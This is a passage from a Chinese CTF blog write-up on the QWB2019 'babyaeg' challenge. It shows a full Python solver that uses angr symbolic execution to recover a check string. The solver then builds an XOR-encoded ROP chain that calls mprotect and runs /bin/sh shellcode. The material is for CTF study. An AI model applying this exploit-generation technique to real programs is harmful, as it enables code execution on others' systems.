+<p>完整代码如下，由于第二部分check需要爆破，因此需要多次尝试才能在规定时间内求解<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">import angr;</span><br><span class="line">import claripy;</span><br><span class="line">import os;</span><br><span class="line">import commands</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">s = lambda data : p.send(data);</span><br><span class="line">sl = lambda data : p.sendline(data);</span><br><span class="line">sla = lambda st,data : p.sendlineafter(st,data);</span><br><span class="line">sa = lambda st,data : p.sendafter(st,data);</span><br><span class="line">ru = lambda st,drop=False : p.recvuntil(st,drop=drop,timeout=4096);</span><br><span class="line">r = lambda : p.recv();</span><br><span class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</span><br><span class="line">context.log_level = &apos;DEBUG&apos;;</span><br><span class="line"></span><br><span class="line">payload = &quot;&quot;;</span><br><span class="line">proj = angr.Project(&quot;1.elf&quot;,auto_load_libs=True);</span><br><span class="line">def get(a,xor1,xor2):</span><br><span class="line">	a = list(a);</span><br><span class="line">	for i in range( len(a) ):</span><br><span class="line">		if i%2==1:</span><br><span class="line">			a[i]=chr( ord(a[i])^xor1 );</span><br><span class="line">		if i%2==0:</span><br><span class="line">			a[i]=chr( ord(a[i])^xor2 );</span><br><span class="line">	return &apos;&apos;.join( [i for i in a] ).encode(&apos;hex&apos;);</span><br><span class="line"></span><br><span class="line">def generate_rop():</span><br><span class="line">	global payload;</span><br><span class="line">	state = proj.factory.blank_state();</span><br><span class="line">	payload_addr = proj.loader.main_object.sections_map[&apos;.bss&apos;].max_addr-999;</span><br><span class="line">	print &apos;payload_addr&apos;,hex(payload_addr);</span><br><span class="line">	const_addr = proj.loader.main_object.sections_map[&apos;.rodata&apos;].min_addr+8;</span><br><span class="line">	const = state.solver.eval( state.memory.load(const_addr,8)  , cast_to=str  );</span><br><span class="line">	if &apos;test&apos; in const:</span><br><span class="line">		const = state.solver.eval( state.memory.load(const_addr+5,8)  , cast_to=str  );</span><br><span class="line">	print &apos;get_const:&apos;,const; </span><br><span class="line">	# get offset</span><br><span class="line">	a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;xor    eax,&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line">	print a;</span><br><span class="line">	xor2 = int(a[0][  a[0].index(&apos;,&apos;)+1: ],16)&amp;0xff;</span><br><span class="line">	xor1 = int(a[1][  a[1].index(&apos;,&apos;)+1: ],16)&amp;0xff;</span><br><span class="line">	print hex(xor1),hex(xor2);</span><br><span class="line">	a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;lea    rax,\[rbp&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line"></span><br><span class="line">	offset = int(a[0][-5:-1],16);</span><br><span class="line">	print hex(offset);</span><br><span class="line">	a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;mov    rdx&apos; &quot;).split(&apos;\n&apos;);</span><br><span class="line">	rop_chain_addr = int(a[1][1:(a[1].index(&apos;:&apos;))],16);</span><br><span class="line">	print hex(rop_chain_addr);</span><br><span class="line">	print hex(offset);</span><br><span class="line">	a = commands.getoutput(r&quot;objdump -M intel -d 1.elf | grep &apos;mov    rsi&apos; &quot;).split(&apos;\n&apos;)</span><br><span class="line">	offset2 = int( a[1][-5:-1], 16);</span><br><span class="line">	rdi = (payload_addr)-(payload_addr)%0x4000;</span><br><span class="line">	rsi = 0x4000;</span><br><span class="line">	rdx = 0x1 | 0x2 | 0x4;</span><br><span class="line">	payload+= const.ljust(offset,&apos;a&apos;);</span><br><span class="line">	payload+= p64( payload_addr+len(payload)+8+8+offset2 );</span><br><span class="line">	payload+= p64(rop_chain_addr);</span><br><span class="line">	# payload+= &apos;a&apos;*8;</span><br><span class="line">	shellcode = asm( shellcraft.amd64.sh() );</span><br><span class="line">	payload+= p64(rsi);</span><br><span class="line">	payload+= p64(rdx);</span><br><span class="line">	payload+= p64(rdi);</span><br><span class="line">	payload+= &apos;a&apos;*(offset2-0x18);</span><br><span class="line">	payload+= &apos;a&apos;*0x8;</span><br><span class="line">	payload+= p64(proj.loader.main_object.plt[&apos;mprotect&apos;]);</span><br><span class="line">	payload+= p64(payload_addr+len(payload)+8);</span><br><span class="line">	print &apos;shellcode_offset:&apos;,len(payload);</span><br><span class="line">	payload+= shellcode;</span><br><span class="line">	payload=get(payload,xor1,xor2);</span><br><span class="line"></span><br><span class="line">def get_ans():</span><br><span class="line">	global payload;</span><br><span class="line">	cfg = proj.analyses.CFGFast(regions=[(proj.entry, proj.loader.main_object.max_addr)], force_complete_scan=False);</span><br><span class="line">	state = proj.factory.full_init_state();</span><br><span class="line">	sm = proj.factory.simulation_manager(state);</span><br><span class="line">	sm.explore( find=proj.entry+0x24 ).move(&apos;found&apos;,&apos;active&apos;);</span><br><span class="line">	main_addr = sm.one_active.solver.eval( sm.one_active.regs.rdi );</span><br><span class="line">	# print &apos;main_addr:&apos;,hex(main_addr);</span><br><span class="line">	main_func = cfg.functions.function(main_addr);</span><br><span class="line">	# print sorted(main_func.get_call_sites());</span><br><span class="line">	block_addr = sorted(main_func.get_call_sites())[-2];</span><br><span class="line">	cur_func_addr = main_func.get_call_target(block_addr);</span><br><span class="line">	# print hex(target_func_addr);</span><br><span class="line">	print proj.loader.main_object.plt[&apos;mprotect&apos;]</span><br><span class="line">	print proj.loader.main_object.sections_map[&apos;.rodata&apos;].max_addr; </span><br><span class="line">	print type(proj.loader.main_object.sections_map[&apos;.bss&apos;]);</span><br><span class="line">	ans = &quot;&quot;;</span><br><span class="line">	while len(ans)!=48:</span><br><span class="line">		a = claripy.BVS(&apos;x&apos;, 8);</span><br><span class="line">		b = claripy.BVS(&apos;y&apos;, 8);</span><br><span class="line">		c = claripy.BVS(&apos;z&apos;, 8);</span><br><span class="line"></span><br><span class="line">		func = cfg.functions.function(cur_func_addr);</span><br><span class="line">		</span><br><span class="line">		state = proj.factory.call_state(cur_func_addr,a,b,c);</span><br><span class="line">		</span><br><span class="line">		sm = proj.factory.simulation_manager(state);</span><br><span class="line">		target_block_addr = func.get_call_sites()[0];</span><br><span class="line">		# print &apos;target_block_addr&apos;,hex(target_block_addr);</span><br><span class="line">		# print func.get_call_sites();</span><br><span class="line">		</span><br><span class="line">		sm.explore( find=target_block_addr );</span><br><span class="line">		ans+=chr( sm.found[0].solver.eval(a) );</span><br><span class="line">		ans+=chr( sm.found[0].solver.eval(b) );</span><br><span class="line">		ans+=chr( sm.found[0].solver.eval(c) );</span><br><span class="line">		cur_func_addr = func.get_call_target(target_block_addr);</span><br><span class="line">	while len(ans)!=51:</span><br><span class="line">		</span><br><span class="line">		func = cfg.functions.function(cur_func_addr);</span><br><span class="line">		target_block_addr = func.get_call_sites()[0];</span><br><span class="line">		</span><br><span class="line">		for i in range(64):</span><br><span class="line">			state = proj.factory.call_state(cur_func_addr,i+48);</span><br><span class="line">			sm = proj.factory.simulation_manager(state);</span><br><span class="line">			sm.explore( find=target_block_addr );</span><br><span class="line">			if sm.found and not sm.found[0].solver.constraints:</span><br><span class="line">				ans+=chr(i+48);</span><br><span class="line">				break;</span><br><span class="line">		cur_func_addr = func.get_call_target(target_block_addr);</span><br><span class="line">	payload+=ans;</span><br><span class="line">get_ans();</span><br><span class="line">generate_rop();</span><br><span class="line"># print os.popen();</span><br><span class="line">print payload;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/05/28/QWB2019-babyaeg-详解/">QWB2019 babyaeg 详解</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">lxf</a></p>
+        <p><span>发布时间:</span>2019-05-28, 21:13:11</p>
+        <p><span>最后更新:</span>2019-06-02, 15:54:36</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/05/28/QWB2019-babyaeg-详解/" title="QWB2019 babyaeg 详解">http://yoursite.com/2019/05/28/QWB2019-babyaeg-详解/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/05/28/QWB2019-babyaeg-详解/　　作者: lxf" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2019/07/14/windows下vc-异常处理机制/">
+                    windows下vc++异常处理机制
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/05/20/RCTF-Reverse-wp/">
+                    RCTF Reverse wp
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#逆向"><span class="toc-number">1.</span> <span class="toc-text">逆向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用angr分析二进制文件"><span class="toc-number">2.</span> <span class="toc-text">利用angr分析二进制文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rop链的生成"><span class="toc-number">3.</span> <span class="toc-text">Rop链的生成</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"QWB2019 babyaeg 详解　| Just a binary noob~~　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2019/07/14/windows下vc-异常处理机制/" title="上一篇: windows下vc++异常处理机制">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/05/20/RCTF-Reverse-wp/" title="下一篇: RCTF Reverse wp">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/24/Windows-本地提权/">Windows 本地提权</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/01/TokyoWesternsCTF-Reverse-wp/">TokyoWesternsCTF Reverse wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/19/SUCTF-Reverse-wp/">SUCTF Re wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/11/32位PWN栈溢出setbuf的利用/">32位PWN栈溢出setbuf的利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/05/De1taCTF-Reverse-WP/">De1taCTF Reverse WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/01/Unicorn初步/">Unicorn初步</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/Golang-Reverse总结/">Golang Reverse总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/14/windows下vc-异常处理机制/">windows下vc++异常处理机制</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/28/QWB2019-babyaeg-详解/">QWB2019 babyaeg 详解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/20/RCTF-Reverse-wp/">RCTF Reverse wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/04/lex-yacc-lex入门/">lex && yacc lex入门</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/29/starctf-Reverse-wp/">*CTF Reverse wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/22/多表置换密码破解/">多表置换密码破解</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/06/Base-N/">Base N</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/28/CRC算法初探/">CRC算法初探</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019-2020 lxf
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit" title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+             title: "a.article-title, .article-more-link a", 
+            
+             tags: ".article-tag a", 
+             categories: ".article-category a, a.tag-list-link", 
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
